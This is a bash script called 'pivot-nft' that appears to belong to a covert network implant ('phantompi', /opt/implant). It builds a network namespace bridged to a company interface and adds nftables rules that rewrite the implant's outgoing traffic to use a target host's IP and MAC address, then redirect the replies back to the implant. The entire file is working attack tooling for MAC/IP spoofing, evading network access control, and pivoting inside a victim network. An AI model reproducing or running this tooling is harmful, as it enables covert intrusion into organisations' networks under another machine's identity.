#!/bin/bash

set -euo pipefail
[ -f /opt/implant/config.env ] && source /opt/implant/config.env

PIVOT_NAMESPACE="${PIVOT_NAMESPACE:-phantompi-pivot}"
PIVOT_BR_IF="${PIVOT_BR_IF:-pivot-br}"
PIVOT_NS_IF="${PIVOT_NS_IF:-pivot-ns}"
PIVOT_IP="${PIVOT_IP:-169.254.66.2/24}"
PIVOT_SNAT_PORT_RANGE="${PIVOT_SNAT_PORT_RANGE:-61000-62000}"
PIVOT_NFT_TABLE_PREFIX="${PIVOT_NFT_TABLE_PREFIX:-phantompi}"
PIVOT_ENABLE_ICMP="${PIVOT_ENABLE_ICMP:-no}"
BRIDGE="${BRIDGE:-br0}"
IFACE_COMPANY="${IFACE_COMPANY:-eth0}"

TABLE="${PIVOT_NFT_TABLE_PREFIX}_pivot_l2"
STATE_DIR="/run/phantompi-pivot"
STATE_FILE="${STATE_DIR}/state.env"

usage() {
  cat <<EOF
Usage: pivot-nft <command> [options]

Commands:
  apply --target-ip IP --target-mac MAC --gateway-ip IP --gateway-mac MAC
  route-add CIDR
  route-del CIDR
  route-flush
  status
  clean
EOF
}

private_ip() {
  echo "${PIVOT_IP%%/*}"
}

need() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[!] missing command: $1" >&2
    exit 1
  }
}

load_state() {
  [ -f "$STATE_FILE" ] || return 0
  source "$STATE_FILE"
}

write_state() {
  sudo mkdir -p "$STATE_DIR"
  sudo tee "$STATE_FILE" >/dev/null <<EOF
TARGET_IP="$TARGET_IP"
TARGET_MAC="$TARGET_MAC"
GATEWAY_IP="$GATEWAY_IP"
GATEWAY_MAC="$GATEWAY_MAC"
NS_MAC="$NS_MAC"
EOF
}

clean() {
  sudo nft delete table bridge "$TABLE" 2>/dev/null || true
  sudo ip netns del "$PIVOT_NAMESPACE" 2>/dev/null || true
  sudo ip link del "$PIVOT_BR_IF" 2>/dev/null || true
  sudo rm -f "$STATE_FILE"
  echo "[+] nft pivot cleaned"
}

status() {
  load_state
  echo "backend=nft-stateful"
  echo "namespace=$PIVOT_NAMESPACE"
  echo "namespace_ready=$(ip netns list | awk '{print $1}' | grep -qx "$PIVOT_NAMESPACE" && echo yes || echo no)"
  echo "bridge_peer_ready=$(ip link show "$PIVOT_BR_IF" >/dev/null 2>&1 && echo yes || echo no)"
  echo "nft_ready=$(sudo nft list table bridge "$TABLE" >/dev/null 2>&1 && echo yes || echo no)"
  echo "target_ip=${TARGET_IP:-}"
  echo "target_mac=${TARGET_MAC:-}"
  echo "gateway_ip=${GATEWAY_IP:-}"
  echo "gateway_mac=${GATEWAY_MAC:-}"
  if ip netns list | awk '{print $1}' | grep -qx "$PIVOT_NAMESPACE"; then
    sudo ip netns exec "$PIVOT_NAMESPACE" ip route show
  fi
}

apply() {
  TARGET_IP=""
  TARGET_MAC=""
  GATEWAY_IP=""
  GATEWAY_MAC=""

  while [ "$#" -gt 0 ]; do
    case "$1" in
      --target-ip) TARGET_IP="$2"; shift 2 ;;
      --target-mac) TARGET_MAC="$2"; shift 2 ;;
      --gateway-ip) GATEWAY_IP="$2"; shift 2 ;;
      --gateway-mac) GATEWAY_MAC="$2"; shift 2 ;;
      *) echo "[!] unknown option: $1" >&2; usage; exit 1 ;;
    esac
  done

  [ -n "$TARGET_IP" ] || { echo "[!] --target-ip is required" >&2; exit 1; }
  [ -n "$TARGET_MAC" ] || { echo "[!] --target-mac is required" >&2; exit 1; }
  [ -n "$GATEWAY_IP" ] || { echo "[!] --gateway-ip is required" >&2; exit 1; }
  [ -n "$GATEWAY_MAC" ] || { echo "[!] --gateway-mac is required" >&2; exit 1; }

  need ip
  need nft

  clean >/dev/null

  sudo ip netns add "$PIVOT_NAMESPACE"
  sudo ip link add "$PIVOT_BR_IF" type veth peer name "$PIVOT_NS_IF"
  sudo ip link set "$PIVOT_NS_IF" netns "$PIVOT_NAMESPACE"
  sudo ip link set "$PIVOT_BR_IF" master "$BRIDGE"
  sudo ip link set "$PIVOT_BR_IF" up
  sudo ip -n "$PIVOT_NAMESPACE" addr add "$PIVOT_IP" dev "$PIVOT_NS_IF"
  sudo ip -n "$PIVOT_NAMESPACE" link set lo up
  sudo ip -n "$PIVOT_NAMESPACE" link set "$PIVOT_NS_IF" up
  local sysctl_port_range
  sysctl_port_range="${PIVOT_SNAT_PORT_RANGE/-/ }"
  sudo ip netns exec "$PIVOT_NAMESPACE" sysctl -w net.ipv4.ip_local_port_range="$sysctl_port_range" >/dev/null
  sudo ip -n "$PIVOT_NAMESPACE" route replace default via "$GATEWAY_IP" dev "$PIVOT_NS_IF" onlink
  sudo ip -n "$PIVOT_NAMESPACE" neigh replace "$GATEWAY_IP" lladdr "$GATEWAY_MAC" dev "$PIVOT_NS_IF" nud permanent

  NS_MAC="$(sudo ip netns exec "$PIVOT_NAMESPACE" cat "/sys/class/net/$PIVOT_NS_IF/address")"

  sudo nft add table bridge "$TABLE"
  sudo nft "add chain bridge $TABLE prerouting { type filter hook prerouting priority -300; policy accept; }"
  sudo nft "add chain bridge $TABLE postrouting { type filter hook postrouting priority 0; policy accept; }"

  local priv
  priv="$(private_ip)"
  sudo nft add rule bridge "$TABLE" postrouting oifname "$IFACE_COMPANY" ether saddr "$NS_MAC" ip saddr "$priv" ip protocol tcp ip saddr set "$TARGET_IP" ether saddr set "$TARGET_MAC" counter
  sudo nft add rule bridge "$TABLE" postrouting oifname "$IFACE_COMPANY" ether saddr "$NS_MAC" ip saddr "$priv" ip protocol udp ip saddr set "$TARGET_IP" ether saddr set "$TARGET_MAC" counter
  sudo nft add rule bridge "$TABLE" prerouting iifname "$IFACE_COMPANY" ip saddr "$GATEWAY_IP" ip daddr "$TARGET_IP" tcp dport "$PIVOT_SNAT_PORT_RANGE" ip daddr set "$priv" ether daddr set "$NS_MAC" counter
  sudo nft add rule bridge "$TABLE" prerouting iifname "$IFACE_COMPANY" ip saddr "$GATEWAY_IP" ip daddr "$TARGET_IP" udp dport "$PIVOT_SNAT_PORT_RANGE" ip daddr set "$priv" ether daddr set "$NS_MAC" counter

  if [ "$PIVOT_ENABLE_ICMP" = "yes" ]; then
    sudo nft add rule bridge "$TABLE" postrouting oifname "$IFACE_COMPANY" ether saddr "$NS_MAC" ip saddr "$priv" ip protocol icmp ip saddr set "$TARGET_IP" ether saddr set "$TARGET_MAC" counter
    sudo nft add rule bridge "$TABLE" prerouting iifname "$IFACE_COMPANY" ip saddr "$GATEWAY_IP" ip daddr "$TARGET_IP" ip protocol icmp ip daddr set "$priv" ether daddr set "$NS_MAC" counter
  fi

  write_state
  echo "[+] nft pivot applied"
}

route_add() {
  load_state
  [ -n "${GATEWAY_IP:-}" ] || { echo "[!] pivot state missing; run apply first" >&2; exit 1; }
  sudo ip -n "$PIVOT_NAMESPACE" route replace "$1" via "$GATEWAY_IP" dev "$PIVOT_NS_IF" onlink
}

route_del() {
  if ip netns list | awk '{print $1}' | grep -qx "$PIVOT_NAMESPACE"; then
    sudo ip -n "$PIVOT_NAMESPACE" route del "$1" 2>/dev/null || true
  fi
}

route_flush() {
  if ip netns list | awk '{print $1}' | grep -qx "$PIVOT_NAMESPACE"; then
    sudo ip -n "$PIVOT_NAMESPACE" route flush dev "$PIVOT_NS_IF" scope global || true
  fi
}

case "${1:-}" in
  apply) shift; apply "$@" ;;
  route-add) shift; [ "$#" -eq 1 ] || { usage; exit 1; }; route_add "$1" ;;
  route-del) shift; [ "$#" -eq 1 ] || { usage; exit 1; }; route_del "$1" ;;
  route-flush) route_flush ;;
  status) status ;;
  clean) clean ;;
  --help|-h|help|"") usage ;;
  *) echo "[!] unknown command: $1" >&2; usage; exit 1 ;;
esac
